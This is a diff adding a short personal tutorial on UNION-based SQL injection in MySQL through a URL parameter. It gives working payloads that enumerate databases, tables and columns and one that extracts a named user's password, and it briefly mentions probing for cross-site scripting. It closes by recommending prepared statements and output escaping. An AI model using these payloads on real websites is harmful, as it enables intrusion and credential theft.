@@ -1,0 +1,78 @@
+Documented by wwwqr-000, based on personal experience.
+
+
+
+If you want to check for a vurnability in a website by manipulating non-handled return value-rows from mysql, you could try to use the UNION method in mysql.
+
+
+If you guess or know the name of the row that gets used to display a username (For example.) You could use the following injection, if the vulnerability is in a url.
+
+
+SELECT name FROM user WHERE ID = 1
+
+
+This could be the default mysql query. If the target doesn't use prepare statements, it could be fatal. In this case, a user with ID 1 exists and is called 'pieter'
+
+What we can do now is apply a UNION to that mysql query to overwrite the name row value, so we can display what we want instead of the name of a user. The 'WHERE ID = 1' is the part where it goes wrong, because the userID is handled in the url as a GET method (https://example.com/blog/?userID=1)
+
+
+'SELECT name FROM user WHERE ID = ' is the thing we can't change at the moment, so we will apply a UNION here:
+
+SELECT name FROM user WHERE ID = 0 UNION SELECT (SELECT 'hacker') AS name
+
+The first thing I did here was change the user's ID to a non-existing number. (Otherwise the 'name' row is not overwritten, because a user with that ID had a name)
+
+Now, instead of displaying a username based on an ID, it displays a custom string (in this case.)
+By using deep sub-queries, you could do almost anything at this point.
+We could check if they used htmlspecialchars here by using a cross-site-scripting injection, for example '' as string.
+If we want to discover other important details about the database, we could do the following things:
+
+1 Show database names
+
+2 Show table names
+
+3 Show column names
+
+
+1. You can use the following query to select one database name. (We only have one subquery in the example-case, so we have to work with LIMIT 1 and OFFSET) This is a example query:
+
+
+
+SELECT name FROM user WHERE ID = 0 UNION SELECT (SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 0) AS name
+
+
+
+This will overwrite the name row with the name of the first-in-list database. To change the index of the list, you can change OFFSET 0 to OFFSET 1.
+
+
+
+
+
+2. When you know the database name, you can get the table names from it with a similar method. By using this query in the UNION subquery, you can get a table name:
+
+
+
+SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'database_name' LIMIT 1 OFFSET 0
+
+
+
+3. When you know the table name, you can get the column names by using the following query:
+
+
+
+SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'database_name' AND TABLE_NAME = 'table_name' LIMIT 1 OFFSET 0
+
+
+
+
+
+This could be a full injection string for the /?userID=1 vulnerability using UNION to get someone's password:
+
+
+
+0 UNION SELECT (SELECT user.password FROM user WHERE user.name = 'pieter') AS name
+
+
+
+This is a short example for a situation where you could apply the UNION method. (This example sometimes is reality, please use prepare statements and htmlspecialchars to decrese the risk of getting hacked)
+
